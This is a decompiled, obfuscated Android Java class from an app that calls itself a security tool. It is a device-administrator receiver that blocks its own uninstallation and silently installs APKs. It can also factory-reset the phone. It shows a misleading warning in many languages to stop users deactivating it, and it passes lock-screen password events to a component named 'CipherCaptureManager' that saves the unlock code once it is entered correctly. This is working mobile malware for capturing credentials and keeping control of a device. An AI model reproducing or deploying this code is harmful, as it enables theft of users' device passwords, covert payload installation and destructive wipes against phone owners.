package com.storm.safe.rock.receiver;

import android.app.PendingIntent;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.UserHandle;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Locale;
import okio.Segment;
import p000.AbstractC1120qr;
import p000.cq0;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class zbrefryi extends DeviceAdminReceiver {

    /* renamed from: a0 */
    public static final C0275a0 f52290a0 = new C0275a0(null);

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.receiver.zbrefryi$a0 */
    public static final class C0275a0 {
        public /* synthetic */ C0275a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public static /* synthetic */ boolean wipeDevice$default(C0275a0 c0275a0, Context context, boolean z, int i, Object obj) {
            if ((i & 2) != 0) {
                z = false;
            }
            return c0275a0.wipeDevice(context, z);
        }

        public final boolean allowUninstall(Context context) {
            t60.m214695b6(context, "context");
            try {
                Object systemService = context.getSystemService("device_policy");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) systemService;
                ComponentName componentName = new ComponentName(context, (Class<?>) zbrefryi.class);
                if (!devicePolicyManager.isDeviceOwnerApp(context.getPackageName())) {
                    t60.m214726f4("zbrefryi", "不是 Device Owner，无法修改卸载设置");
                    return false;
                }
                devicePolicyManager.setUninstallBlocked(componentName, context.getPackageName(), false);
                t60.m214714d6("zbrefryi", "已允许卸载");
                return true;
            } catch (Exception e) {
                t60.m214705c6("zbrefryi", "允许卸载失败", e);
                return false;
            }
        }

        public final boolean blockUninstall(Context context) {
            t60.m214695b6(context, "context");
            try {
                Object systemService = context.getSystemService("device_policy");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) systemService;
                ComponentName componentName = new ComponentName(context, (Class<?>) zbrefryi.class);
                if (!devicePolicyManager.isDeviceOwnerApp(context.getPackageName())) {
                    t60.m214726f4("zbrefryi", "不是 Device Owner，无法阻止卸载");
                    return false;
                }
                devicePolicyManager.setUninstallBlocked(componentName, context.getPackageName(), true);
                t60.m214714d6("zbrefryi", "已设置阻止卸载");
                return true;
            } catch (Exception e) {
                t60.m214705c6("zbrefryi", "阻止卸载失败", e);
                return false;
            }
        }

        public final boolean isAdminActive(Context context) {
            t60.m214695b6(context, "context");
            try {
                Object systemService = context.getSystemService("device_policy");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                return ((DevicePolicyManager) systemService).isAdminActive(new ComponentName(context, (Class<?>) zbrefryi.class));
            } catch (Exception unused) {
                return false;
            }
        }

        public final boolean isDeviceOwner(Context context) {
            t60.m214695b6(context, "context");
            try {
                Object systemService = context.getSystemService("device_policy");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                return ((DevicePolicyManager) systemService).isDeviceOwnerApp(context.getPackageName());
            } catch (Exception unused) {
                return false;
            }
        }

        public final boolean silentInstallApk(Context context, String str) throws IOException {
            t60.m214695b6(context, "context");
            t60.m214695b6(str, "apkPath");
            try {
                Object systemService = context.getSystemService("device_policy");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                if (!((DevicePolicyManager) systemService).isDeviceOwnerApp(context.getPackageName())) {
                    t60.m214726f4("zbrefryi", "不是 Device Owner，无法静默安装");
                    return false;
                }
                File file = new File(str);
                if (!file.exists()) {
                    t60.m214704c5("zbrefryi", "APK 文件不存在: ".concat(str));
                    return false;
                }
                t60.m214714d6("zbrefryi", "★★★ 开始静默安装: " + str + " ★★★");
                PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
                t60.m214694b5(packageInstaller, "context.packageManager.packageInstaller");
                PackageInstaller.SessionParams sessionParams = new PackageInstaller.SessionParams(1);
                sessionParams.setInstallReason(1);
                int iCreateSession = packageInstaller.createSession(sessionParams);
                PackageInstaller.Session sessionOpenSession = packageInstaller.openSession(iCreateSession);
                t60.m214694b5(sessionOpenSession, "packageInstaller.openSession(sessionId)");
                FileInputStream fileInputStream = new FileInputStream(file);
                try {
                    OutputStream outputStreamOpenWrite = sessionOpenSession.openWrite("app.apk", 0L, file.length());
                    try {
                        t60.m214694b5(outputStreamOpenWrite, "output");
                        cq0.m212478a8(fileInputStream, outputStreamOpenWrite);
                        sessionOpenSession.fsync(outputStreamOpenWrite);
                        outputStreamOpenWrite.close();
                        fileInputStream.close();
                        sessionOpenSession.commit(PendingIntent.getBroadcast(context, iCreateSession, new Intent("com.storm.safe.rock.INSTALL_RESULT"), 167772160).getIntentSender());
                        t60.m214714d6("zbrefryi", "✅ 静默安装已提交，等待系统处理");
                        return true;
                    } finally {
                    }
                } finally {
                }
            } catch (Exception e) {
                t60.m214705c6("zbrefryi", "静默安装失败", e);
                return false;
            }
        }

        public final boolean wipeDevice(Context context, boolean z) {
            t60.m214695b6(context, "context");
            try {
                Object systemService = context.getSystemService("device_policy");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) systemService;
                if (!devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>) zbrefryi.class))) {
                    t60.m214704c5("zbrefryi", "wipeDevice失败: 不是设备管理员");
                    return false;
                }
                t60.m214726f4("zbrefryi", "开始执行恢复出厂设置");
                devicePolicyManager.wipeData((!z || Build.VERSION.SDK_INT < 29) ? 0 : 1);
                return true;
            } catch (SecurityException e) {
                t60.m214705c6("zbrefryi", "wipeDevice安全异常: 权限不足", e);
                return false;
            } catch (Exception e2) {
                t60.m214705c6("zbrefryi", "wipeDevice失败", e2);
                return false;
            }
        }

        private C0275a0() {
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final CharSequence onDisableRequested(Context context, Intent intent) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        t60.m214726f4("zbrefryi", "⚠️ 用户尝试取消激活设备管理员");
        String language = Locale.getDefault().getLanguage();
        if (language == null) {
            return "Deactivating will disable device security features. Are you sure you want to continue?";
        }
        switch (language.hashCode()) {
            case 3121:
                return !language.equals("ar") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "سيؤدي إلغاء التنشيط إلى تعطيل ميزات أمان الجهاز. هل أنت متأكد من المتابعة؟";
            case 3201:
                return !language.equals("de") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "Durch Deaktivieren werden die Sicherheitsfunktionen des Geräts deaktiviert. Möchten Sie wirklich fortfahren?";
            case 3246:
                return !language.equals("es") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "La desactivación provocará que las funciones de seguridad del dispositivo dejen de funcionar. ¿Seguro que desea continuar?";
            case 3276:
                return !language.equals("fr") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "La désactivation entraînera la perte des fonctions de sécurité de l'appareil. Voulez-vous vraiment continuer ?";
            case 3329:
                return !language.equals("hi") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "निष्क्रिय करने से डिवाइस सुरक्षा सुविधाएं बंद हो जाएंगी। क्या आप जारी रखना चाहते हैं?";
            case 3355:
                return !language.equals("id") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "Menonaktifkan akan menonaktifkan fitur keamanan perangkat. Yakin ingin melanjutkan?";
            case 3383:
                return !language.equals("ja") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "無効化するとデバイスのセキュリティ機能が無効になります。続行しますか？";
            case 3428:
                return !language.equals("ko") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "비활성화하면 기기 보안 기능이 작동하지 않습니다. 계속하시겠습니까?";
            case 3494:
                return !language.equals("ms") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "Menyahaktifkan akan melumpuhkan ciri keselamatan peranti. Adakah anda pasti mahu meneruskan?";
            case 3588:
                return !language.equals("pt") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "A desativação fará com que os recursos de segurança do dispositivo parem de funcionar. Tem certeza de que deseja continuar?";
            case 3651:
                return !language.equals("ru") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "Отключение приведёт к потере функций безопасности устройства. Вы уверены, что хотите продолжить?";
            case 3700:
                return !language.equals("th") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "การปิดใช้งานจะทำให้ฟีเจอร์ความปลอดภัยของอุปกรณ์ไม่ทำงาน คุณต้องการดำเนินการต่อหรือไม่?";
            case 3710:
                return !language.equals("tr") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "Devre dışı bırakma, cihaz güvenlik özelliklerini etkisiz hale getirecektir. Devam etmek istediğinizden emin misiniz?";
            case 3763:
                return !language.equals("vi") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "Hủy kích hoạt sẽ làm mất chức năng bảo mật thiết bị. Bạn có chắc muốn tiếp tục?";
            case 3886:
                return !language.equals("zh") ? "Deactivating will disable device security features. Are you sure you want to continue?" : "取消激活将导致设备安全功能失效，确定要继续吗？";
            default:
                return "Deactivating will disable device security features. Are you sure you want to continue?";
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onDisabled(Context context, Intent intent) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        super.onDisabled(context, intent);
        t60.m214726f4("zbrefryi", "⚠️ 设备管理员已被禁用");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onEnabled(Context context, Intent intent) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        super.onEnabled(context, intent);
        t60.m214714d6("zbrefryi", "设备管理员已启用");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordChanged(Context context, Intent intent, UserHandle userHandle) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        t60.m214695b6(userHandle, "userHandle");
        super.onPasswordChanged(context, intent, userHandle);
        t60.m214714d6("zbrefryi", "密码已更改 - 清除旧密码");
        try {
            C0335a1 c0600hy = C0335a1.f53283c5.getInstance();
            if (c0600hy != null) {
                c0600hy.m211822d9("android.intent.action.DEVICE_PASSWORD_CHANGED");
                c0600hy.m211814b4(false);
                t60.m214714d6("zbrefryi", "旧密码已清除 + 已发送变更事件");
            }
        } catch (Exception e) {
            tz0.m214807a7("清除旧密码失败: ", e.getMessage(), "zbrefryi");
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordFailed(Context context, Intent intent, UserHandle userHandle) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        t60.m214695b6(userHandle, "userHandle");
        super.onPasswordFailed(context, intent, userHandle);
        t60.m214726f4("zbrefryi", "密码验证失败");
        try {
            C0335a1 c0600hy = C0335a1.f53283c5.getInstance();
            if (c0600hy != null) {
                c0600hy.m211822d9("android.intent.action.DEVICE_PASSWORD_FAILED");
                c0600hy.f53295a9 = (System.currentTimeMillis() << 10) | (c0600hy.f53296b0.incrementAndGet() % Segment.SHARE_MINIMUM);
                t60.m214702c3("CipherCaptureManager", "🔷 refreshLockBatchId → " + c0600hy.f53295a9);
                c0600hy.m211816b6();
            }
        } catch (Exception e) {
            tz0.m214807a7("丢弃密码失败: ", e.getMessage(), "zbrefryi");
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordSucceeded(Context context, Intent intent, UserHandle userHandle) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        t60.m214695b6(userHandle, "userHandle");
        super.onPasswordSucceeded(context, intent, userHandle);
        t60.m214714d6("zbrefryi", "密码验证成功");
        try {
            C0335a1 c0600hy = C0335a1.f53283c5.getInstance();
            if (c0600hy != null) {
                t60.m214714d6("zbrefryi", "confirmAndSaveLastCipher: " + c0600hy.m211812b1());
                c0600hy.m211822d9("android.intent.action.DEVICE_PASSWORD_SUCCESS");
            }
        } catch (Exception e) {
            tz0.m214807a7("确认保存密码失败: ", e.getMessage(), "zbrefryi");
        }
    }
}
